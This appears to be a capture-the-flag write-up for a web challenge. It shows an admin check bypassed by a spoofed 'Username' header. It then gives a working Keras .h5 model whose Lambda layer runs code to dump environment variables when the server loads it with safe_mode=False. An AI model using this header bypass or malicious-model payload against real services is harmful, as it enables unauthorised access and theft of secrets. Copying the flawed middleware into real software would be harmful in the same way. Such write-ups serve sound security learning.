#### Regular Dude
- points earned: 10
#### Where's the flag?
- The flag is loaded into the docker container via an environment variable.
	```Dockerfile
	ENV FLAG=REDACTED
	```
- I don't see any other references to the flag anywhere in the project code so I'm thinking that one of the following is true:
	- code is missing
	- The solution requires me to read environment vars.

#### Notes / Intuition
- Looking at the app from a UX perspective I see that it has the following features:
	- register
	- login
	- upload/run model
- Clicking to upload and run a model  opens a page with the JSON `{"error":"Unauthorized"}`.
- At this point I suspect that the solution will be an insecure deserializtion in a tensorflow model, BUT, I'll need to become authorized to use the tool.
- Looking at the code I see tat routes for `upload-model` and `model` both have `admin_required` middleware applied.
- The code for the `admin_required` middleware is below.
	```python
	def admin_required(f):
	    """
	    Admin middleware. Using re, check if session username is equal to "admin", ignore case.
	    """
	    def wrapper(*args, **kwargs):
	        username = session.get('username') or request.headers.get('Username', '')
	        if re.match(r'^admin$', username, re.IGNORECASE):
	            return f(*args, **kwargs)
	        else:
	            return jsonify({'error': 'Unauthorized'}), 401
	    wrapper.__name__ = f.__name__
	    return wrapper
	```
	- The middleware asserts that the username is `admin`
	- HOWEVER, there's a bit of an issue with the logic. If the user does not have a session, then the username is pulled from the `Username` headers.
	- That means this can be bypassed by removing the cookie and adding `username: admin`.
- Since I'm now able to reach the authenticated routes I can being to look at the logic for those routes.
- I found the code below in the `model` route which looked very familiar because I have an exploit for similar code in my notes.
	```python
	model = keras.models.load_model(model_path, safe_mode=False)
	```
- This code is vulnerable to insecure deserialaztion and I can use this to read the environment variables within the docker container.

#### Solution
- To resolve this I put the script below onto the the challenges docker container.
	- I want to make sure that I am creating a model using the same Python and lib versions as the web app and this is the easiest way to do that.
- Running the script produces and `exploit.hs` file.
- I uploaded the `exploit.h5` to the challenge web app and the response contains the flag.
```python
import tensorflow as tf

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(lambda x: str(__import__('os').environ)))
model.compile()
model.save("exploit.h5")
```
